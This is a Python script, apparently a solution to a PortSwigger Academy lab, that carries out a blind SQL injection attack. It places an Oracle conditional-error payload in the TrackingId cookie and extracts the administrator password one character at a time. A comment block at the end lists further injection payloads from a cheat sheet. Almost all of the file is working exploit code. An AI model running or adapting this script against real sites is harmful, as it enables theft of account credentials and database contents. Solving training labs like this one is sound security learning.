import os
import requests

burp0_url = "https://0a0400a20425177fc111d5440013006a.web-security-academy.net:443/filter?category=Pets"
burp0_cookies = {"TrackingId": "6O7pvAs2qdQkN8x9", "session": "2UxCVEBGjbPgaR1GbBSpINWiWFhIeSSK"}
burp0_headers = {"Sec-Ch-Ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.99 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0a0400a20425177fc111d5440013006a.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories\\", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

# ######################  until here burp paste of request for python  ########################## #
# code by amotz for: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors


char_list = "abcdefghijklmnopqrstuvwxyz1234567890"
trackingId = burp0_cookies["TrackingId"]
loaded_cookies = burp0_cookies
response = requests.get(burp0_url, headers=burp0_headers, cookies=loaded_cookies, proxies={"http": "http://127.0.0.1:8080"})
# print(response.status_code, len(response.content)) #DEBG print

def check_password():
    password = ""
    pass_index = 1
    done = False
    while not done:
        for i in char_list:
            # print(i) #DEBG print
            payload = f"'||(SELECT CASE WHEN SUBSTR(password,{pass_index},1)='{i}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            loaded_cookies["TrackingId"] = trackingId + payload
            response = requests.get(burp0_url, headers=burp0_headers, cookies=loaded_cookies, proxies={"http": "http://127.0.0.1:8080"})
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"Status code:", response.status_code, "\r\nlength:", len(response.content)) #DEBG print
            print(f"Payload:\r\n", loaded_cookies["TrackingId"]) #DEBG print
            print(f"\r\nPartial password:\r\n {password}") #DEBG 
            if response.status_code != 200:
                password += i
                # print(f"partial password is {password}")
                pass_index += 1
                break
            elif i == char_list[-1] and password != "":
                done = True
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"DONE! password is ready!\n\npassword for username 'administrator' is:\n{password}\nuse it wisely")
                break
            elif i == char_list[-1] and password =="":
                print(f"sorry but no success pls check ingridiants:{char_list}")
                done = True
                break

if __name__ == '__main__':
    check_password()


# materials:

    # payload lab before= f"'+AND+SUBSTR((SELECT+password+FROM+users+WHERE+username+%3d+'administrator'),+{pass_index},+1)+=+'{i}"
    # " oracle:	                 SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual "
    # cheetsheet  ' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a


